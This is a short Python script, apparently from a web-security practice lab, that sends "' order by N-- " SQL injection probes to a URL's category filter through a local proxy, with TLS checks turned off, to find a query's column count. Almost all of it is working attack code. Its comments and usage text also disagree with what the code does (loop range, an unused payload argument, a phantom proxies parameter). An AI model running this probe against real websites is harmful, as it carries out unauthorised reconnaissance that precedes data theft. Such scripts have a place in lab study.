import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# The script when run will pass through the below proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

"""
    Function to determine the number of columns in a SQL query via SQL Injection.
    
    :param url: The target URL vulnerable to SQL Injection.
    :param sqli_payload: The SQL Injection payload to be used.
    :param proxies: Optional proxies for the requests.
    :return: The number of columns if found, otherwise None.
"""
def exploit_sqli_get_column_count(url, sqli_payload):
    path = "/filter?category=Gifts"
    for i in range(1, 51):  # Testing for column counts from 1 to 20
        test_payload = f"{sqli_payload}{i}-- "
        full_url = f"{url}{path}{test_payload}"
        response = requests.get(full_url, verify=False, proxies=proxies)
        if response.status_code != 200:
            return i - 1  # Return the last successful column count
        i+=1
    return None  # If no errors were encountered, return None

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  # Get the URL from command line arguments
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(1)
    
    print("[+] Figuring out number of columns...")
    sqli_payload = "'+order+by+"
    num_columns = exploit_sqli_get_column_count(url, sqli_payload)
    print(num_columns)
    if num_columns:
        print("[+] The site appears to be vulnerable to SQL Injection, and the number of columns is: %d" % num_columns)
    else:
        print("[+] The site does not appear to be vulnerable to SQL Injection.")